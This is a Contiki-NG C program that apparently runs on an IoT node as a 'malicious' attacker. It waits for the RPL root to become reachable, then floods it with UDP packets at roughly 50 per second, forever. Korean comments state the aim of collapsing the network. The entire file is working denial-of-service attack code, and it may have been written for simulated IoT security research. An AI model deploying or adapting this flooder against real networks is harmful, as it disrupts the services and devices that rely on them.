#include "contiki.h"
#include "net/routing/routing.h"
#include "net/netstack.h"
#include "net/ipv6/simple-udp.h"
#include <string.h>

#include "sys/log.h"
#define LOG_MODULE "MaliciousFlood"
#define LOG_LEVEL LOG_LEVEL_INFO

#define UDP_CLIENT_PORT 8765
#define UDP_SERVER_PORT 5678

/*
정상 server에게 의도적으로 과도한 UDP 패킷을 반복 전송하여
네트워크를 붕괴시킴 (초당 약 50개 이상의 패킷을 발송) 
*/


static struct simple_udp_connection malicious_conn;

/*---------------------------------------------------------------------------*/
PROCESS(malicious_flood_process, "Malicious UDP Flood Node");
AUTOSTART_PROCESSES(&malicious_flood_process);
/*---------------------------------------------------------------------------*/

PROCESS_THREAD(malicious_flood_process, ev, data)
{
  static struct etimer flood_timer;
  static uint32_t flood_count = 0;
  uip_ipaddr_t dest_ipaddr;

  PROCESS_BEGIN();

  LOG_INFO("Malicious node started (UDP Flood Attack)\n");

  /* Listen on the same ports as normal client/server */
  simple_udp_register(&malicious_conn,
                      UDP_CLIENT_PORT,
                      NULL,
                      UDP_SERVER_PORT,
                      NULL); // receive callback 없음 → flood only

  /* Wait until RPL root is reachable */
  while(!NETSTACK_ROUTING.node_is_reachable() ||
        !NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
    LOG_INFO("Waiting for RPL root...\n");
    PROCESS_PAUSE();
  }

  LOG_INFO("Root detected, starting flood attack!\n");

  while(1) {
    // 매우 짧은 인터벌: 50 packets/sec
    etimer_set(&flood_timer, CLOCK_SECOND / 50);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&flood_timer));

    char msg[32];
    snprintf(msg, sizeof(msg), "flood-%" PRIu32, flood_count);

    simple_udp_sendto(&malicious_conn, msg, strlen(msg), &dest_ipaddr);

    LOG_INFO("FLOOD → %s\n", msg);
    flood_count++;
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
